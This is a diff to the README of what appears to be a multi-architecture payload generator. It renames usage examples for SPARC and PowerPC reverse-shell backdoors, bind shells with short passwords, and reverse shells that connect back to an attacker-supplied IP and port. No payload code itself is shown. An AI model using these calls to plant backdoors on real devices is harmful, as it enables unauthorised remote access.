@@ -103,19 +103,19 @@ Ubuntu（debian）:
 >>> mips64el_backdoor(reverse_ip,reverse_port)
 >>> x86el_backdoor(reverse_ip,reverse_port)
 >>> x64el_backdoor(reverse_ip, reverse_port)
->>> sparc_backdoor(reverse_ip, reverse_port)#big endian
->>> powerpc_backdoor(reverse_ip, reverse_port)
->>> powerpcle_backdoor(reverse_ip, reverse_port)
->>> powerpc64_backdoor(reverse_ip, reverse_port)
->>> powerpc64le_backdoor(reverse_ip, reverse_port)
+>>> sparc32.sparc_backdoor(reverse_ip, reverse_port)#big endian
+>>> powerpc_info.powerpc_backdoor(reverse_ip, reverse_port)
+>>> powerpc_info.powerpcle_backdoor(reverse_ip, reverse_port)
+>>> powerpc_info.powerpc64_backdoor(reverse_ip, reverse_port)
+>>> powerpc_info.powerpc64le_backdoor(reverse_ip, reverse_port)
 >>> x86_bind_shell(listen_port, passwd)
 >>> x64_bind_shell(listen_port, passwd)
 >>> armelv7_bind_shell(listen_port, passwd)
 >>> aarch64_ bind_ shell(listen_port, passwd)
 >>> mips_bind_shell(listen_port, passwd)
 >>> mipsel_bind_shell(listen_port, passwd)
->>> sparc_bind_shell(listen_port, passwd)
->>> powerpc_bind_shell(listen_port, passwd)
+>>> sparc32.sparc_bind_shell(listen_port, passwd)
+>>> powerpc_info.powerpc_bind_shell(listen_port, passwd)
 ```
 
 （Note that the maximum password length is 4 characters for x86（32bits） and 8 characters for x64（64bits））
@@ -164,10 +164,10 @@ Then connect to the port bound to the device (password exists)
 >>> android_aarch64_backdoor(reverse_ip,reverse_port)
 >>> x86el_reverse_sl(reverse_ip,reverse_port)
 >>> x64el_reverse_sl(reverse_ip,reverse_port)
->>> ppc_reverse_sl(reverse_ip,reverse_port)
->>> ppcle_reverse_sl(reverse_ip,reverse_port)
->>> ppc64_reverse_sl(reverse_ip,reverse_port)
->>> ppc64le_reverse_sl(reverse_ip,reverse_port)
+>>> powerpc_info.ppc_reverse_sl(reverse_ip,reverse_port)
+>>> powerpc_info.ppcle_reverse_sl(reverse_ip,reverse_port)
+>>> powerpc_info.ppc64_reverse_sl(reverse_ip,reverse_port)
+>>> powerpc_info.ppc64le_reverse_sl(reverse_ip,reverse_port)
 ```
 
 example:
